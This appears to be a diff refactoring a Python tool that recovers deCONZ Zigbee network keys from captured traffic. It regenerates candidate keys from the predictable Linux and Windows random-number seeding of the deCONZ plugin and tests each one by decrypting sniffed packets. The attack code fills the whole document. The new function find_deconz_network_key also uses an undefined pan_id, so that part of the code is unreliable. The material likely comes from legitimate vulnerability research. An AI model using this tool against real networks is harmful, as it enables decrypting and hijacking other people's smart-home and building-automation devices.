@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
+from __future__ import annotations
+
 import sys
 
-if sys.version_info < (3, 8):
-    raise RuntimeError(f"Python 3.8 or newer is required, you have {sys.version_info}")
-
 import typing
+import warnings
 import itertools
 
 import tqdm
@@ -16,10 +16,18 @@ import scapy.packet
 import scapy.layers.zigbee
 import scapy.layers.dot15d4
 
-import killerbee.scapy_extensions
+import zigbee_crypt
 
 
 scapy.config.conf.dot15d4_protocol = "zigbee"
+scapy.config.conf.layers.filter(
+    [
+        scapy.layers.dot15d4.Dot15d4,
+        scapy.layers.dot15d4.Dot15d4Data,
+        scapy.layers.zigbee.ZigbeeSecurityHeader,
+        scapy.layers.zigbee.ZigbeeNWK,
+    ]
+)
 
 DRESDEN_ELEKTRONIK_PREFIX = 0x00212E0000000000
 DRESDEN_ELEKTRONIK_MASK = 0xFFFFFF0000000000
@@ -65,7 +73,7 @@ class WindowsLCG(BaseLCG):
 
 def compute_key(rng: BaseLCG) -> bytes:
     """
-    Computes the network key with the provided LCG using the algorithm used by the
+    Computes the network key with the provided LCG with the algorithm used by the
     deCONZ REST plugin.
 
     Note that even with a strong random number generator (which does not leak its
@@ -73,7 +81,7 @@ def compute_key(rng: BaseLCG) -> bytes:
     bits, from the expected 128 bits.
     """
 
-    # The first output is used to generate the PAN ID
+    # The first output is used to generate the PAN ID. We skip it.
     next(rng)
 
     # Leading zeroes are skipped: [0x01, 0x20, 0x03] becomes the ASCII string "1203"
@@ -123,53 +131,101 @@ def iter_key_candidates_windows(pan_id: int) -> typing.Iterator[bytes]:
         yield compute_key(WindowsLCG(seed_candidate))
 
 
-def validate_key(packet, key: bytes) -> bool:
+def validate_key(packet: scapy.layers.dot15d4.Dot15d4, key: bytes) -> bool:
     """
     Returns whether or not the key can decrypt the provided packet.
+
+    This is a slightly optimized version of `killerbee.scapy_extensions.kbdecrypt`.
     """
 
-    # TODO: This is unnecessarily slow
-    result = killerbee.scapy_extensions.kbdecrypt(packet, key=key)
-    return type(result) is not scapy.packet.Raw
+    # XXX: this mutates the packet
+    packet.nwk_seclevel = 5
+    packet.data += packet.mic
+    packet.mic = packet.data[-4:]
+    packet.data = packet.data[:-4]
+
+    if scapy.layers.zigbee.ZigbeeAppDataPayload in packet:
+        payload = packet[scapy.layers.zigbee.ZigbeeAppDataPayload].do_build()
+        epid = packet[scapy.layers.zigbee.ZigbeeNWK].ext_src
+    else:
+        payload = packet[scapy.layers.zigbee.ZigbeeNWK].do_build()
+        epid = packet[scapy.layers.zigbee.ZigbeeSecurityHeader].source
+
+    trim_size = len(packet.mic) + len(packet.data)
+    payload = payload[:-trim_size]
+
+    sec_ctrl_byte = bytes(packet[scapy.layers.zigbee.ZigbeeSecurityHeader])[0:1]
+    nonce = (
+        epid.to_bytes(8, "little")
+        + packet[scapy.layers.zigbee.ZigbeeSecurityHeader].fc.to_bytes(4, "little")
+        + sec_ctrl_byte
+    )
+    encrypted = packet.data
+
+    with warnings.catch_warnings():
+        warnings.filterwarnings("ignore", category=DeprecationWarning)
+        _, mic_valid = zigbee_crypt.decrypt_ccm(
+            key, nonce, packet.mic, encrypted, payload
+        )
+
+    return mic_valid == 1
+
+
+def extract_unique_deconz_packets(
+    reader: scapy.all.PcapReader,
+) -> typing.Iterable[int, scapy.layers.dot15d4.Dot15d4]:
+    seen_networks = set()
+
+    for packet in reader:
+        # We can only work with encrypted packets
+        try:
+            sec_hdr = packet[scapy.layers.zigbee.ZigbeeSecurityHeader]
+        except IndexError:
+            continue
+
+        pan_id = packet[scapy.layers.dot15d4.Dot15d4Data].dest_panid
+        nwk = packet[scapy.layers.zigbee.ZigbeeNWK]
+
+        # Need the EPID to check for a deCONZ IEEE
+        if "extended_src" not in nwk.flags:
+            continue
+
+        if nwk.ext_src & DRESDEN_ELEKTRONIK_MASK != DRESDEN_ELEKTRONIK_PREFIX:
+            continue
+
+        if pan_id in seen_networks:
+            continue
+
+        seen_networks.add(pan_id)
+
+        yield pan_id, packet
+
+
+def validate_key_helper(
+    packet_and_key: tuple[scapy.layers.dot15d4.Dot15d4, bytes]
+) -> tuple[bool, bytes]:
+    packet, key = packet_and_key
+    return validate_key(packet, key), key
+
+
+def find_deconz_network_key(packet: scapy.layers.dot15d4.Dot15d4) -> bytes | None:
+    for key in itertools.chain(
+        iter_key_candidates_linux(pan_id),
+        iter_key_candidates_windows(pan_id),
+    ):
+        if validate_key(packet, key):
+            return key
 
 
 if __name__ == "__main__":
-    seen_networks = set()
-
     print("Reading packets from", sys.argv[1], file=sys.stderr)
 
     with scapy.all.PcapReader(sys.argv[1]) as reader:
-        for packet in reader:
-            # We can only work with encrypted packets
-            try:
-                sec_hdr = packet[scapy.layers.zigbee.ZigbeeSecurityHeader]
-            except IndexError:
-                continue
-
-            pan_id = packet[scapy.layers.dot15d4.Dot15d4Data].dest_panid
-            nwk = packet[scapy.layers.zigbee.ZigbeeNWK]
-
-            # Need the extended source to check for a deCONZ IEEE
-            if "extended_src" not in nwk.flags:
-                continue
-
-            if nwk.ext_src & DRESDEN_ELEKTRONIK_MASK != DRESDEN_ELEKTRONIK_PREFIX:
-                continue
-
-            if pan_id in seen_networks:
-                continue
-
+        for pan_id, packet in extract_unique_deconz_packets(reader):
             print(f"Found deCONZ network 0x{pan_id:04X}", file=sys.stderr)
-            seen_networks.add(pan_id)
+            key = find_deconz_network_key(packet)
 
-            for key in itertools.chain(
-                iter_key_candidates_linux(pan_id),
-                iter_key_candidates_windows(pan_id),
-            ):
-                if validate_key(packet, key):
-                    break
+            if key:
+                print(f"Network key for 0x{pan_id:04X}: {format_key(key)}")
             else:
                 print(f"Network key for 0x{pan_id:04X}: not found")
-                continue
-
-            print(f"Network key for 0x{pan_id:04X}: {format_key(key)}")
